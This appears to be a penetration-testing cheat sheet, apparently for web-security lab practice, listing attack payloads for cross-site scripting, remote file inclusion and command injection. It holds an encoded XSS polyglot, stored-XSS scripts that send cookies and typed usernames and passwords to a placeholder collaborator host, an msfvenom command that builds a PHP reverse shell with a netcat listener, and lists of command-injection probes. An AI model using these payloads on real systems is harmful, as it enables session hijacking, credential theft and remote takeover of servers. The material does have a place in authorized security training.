# XSS
### XSS Hunter
`
https://xsshunter.com/
`
### XSS Polyglot (decode to get actual payload)
`
amFWYXNDcmlwdDovKi0vKmAvKlxgLyonLyoiLyoqLygvKiAqL29uZXJyb3I9YWxlcnQoJ1RITScpICkvLyUwRCUwQSUwZCUwYS8vPC9zdFlsZS88L3RpdExlLzwvdGVYdGFyRWEvPC9zY1JpcHQvLS0hPlx4M2NzVmcvPHNWZy9vTmxvQWQ9YWxlcnQoJ1RITScpLy8+XHgzZQ==
`
### Stored XSS
#### Steal cookie
`<script>
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>`

#### Capture other users information
`<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">`

### Reflected XSS
#### Reflected XSS into attribute with angle brackets HTML-encoded

`"onmouseover="alert(1)`

#### Reflected DOM XSS

`\"-alert(1)}//`

#### Reflected XSS into HTML context with most tags and attributes blocked

`<$tag$ $attribute$> Using Burp Suite Intruder`

#### Reflected XSS into a JavaScript string with single quote and backslash escaped

`</script><script>alert(1)</script>`

#### Reflected XSS with some SVG markup allowed

`<svg><animatetransform onbegin=alert(1)>`

#### Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped

`\'-alert(1)//`

# RFI
### Shell generation
`msfvenom -p php/reverse_php lport=4444 lhost=<your ip > /path/to/shell`

### Start listen on port
`cd /path/to/shell`

`sudo python3 -m http.server`

`nc -lvp 4444`                 


# Command Injection
Use one of the following commands to test command injection. Or you can use `Burp Suite Intruder` with this [payload](https://github.com/payloadbox/command-injection-payload-list).
### Blind
`ping`

`>` forcing some output && `cat`

`curl` great way

### Verbose
#### Linux
`whoami` || `ls` || `ping` || `sleep` ||  `nc`

#### Windows
`whoami` || `dir` || `ping` || `timeout`
